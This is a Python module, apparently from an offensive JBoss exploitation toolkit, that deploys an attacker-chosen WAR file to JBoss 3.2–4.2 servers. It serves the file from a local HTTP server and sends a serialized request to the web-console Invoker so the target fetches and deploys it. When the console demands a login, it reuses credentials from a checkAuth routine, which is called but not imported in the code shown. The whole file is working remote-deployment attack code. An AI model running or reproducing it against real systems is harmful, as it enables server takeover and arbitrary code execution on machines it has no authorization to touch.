from src.platform.jboss.interfaces import JINTERFACES
from src.module.deploy_utils import _serve, wc_invoke, waitServe
from requests import get
from threading import Thread
from time import sleep
from log import LOG
from os.path import abspath
import utility

versions = ["3.2", "4.0", "4.2"]
title = JINTERFACES.WC
def deploy(fingerengine, fingerprint):
    """
    """

    war_file = abspath(fingerengine.options.deploy)
    war_name = war_file.rsplit('/', 1)[1]

    # start the local HTTP server
    server_thread = Thread(target=_serve, args=(war_file,))
    server_thread.start()
    sleep(1.5)

    utility.Msg("Preparing to deploy {0}...".format(war_file))

    url = "http://{0}:{1}/web-console/Invoker".format(
                        fingerengine.options.ip, fingerprint.port)

    local_url = "http://{0}:8000/{1}".format(utility.local_address(), war_name)

    # poll the URL to check for a 401
    response = utility.requests_get(url)
    if response.status_code == 401:
        utility.Msg("Host %s:%s requires auth for web-console, checking..", 
                    LOG.DEBUG)    
        cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                            fingerprint.title, fingerprint.version)

        if cookies:
            (usr, pswd) = (cookies[1].username, cookies[1].password)
            response = wc_invoke(url, local_url, usr, pswd)
        else:
            utility.Msg("Could not get auth for %s:%s" % 
                         (fingerengine.options.ip, fingerprint.port), LOG.ERROR)
    
    else:
        # run our java lib for serializing the request
        response = wc_invoke(url, local_url)

    if not response == '':
        utility.Msg(response, LOG.DEBUG)

    if waitServe(server_thread):
        utility.Msg("{0} deployed to {1}".format(war_file,
                                            fingerengine.options.ip),
                                            LOG.SUCCESS)

    try:
        get("http://localhost:8000/", timeout=1.0)
    except:
        pass
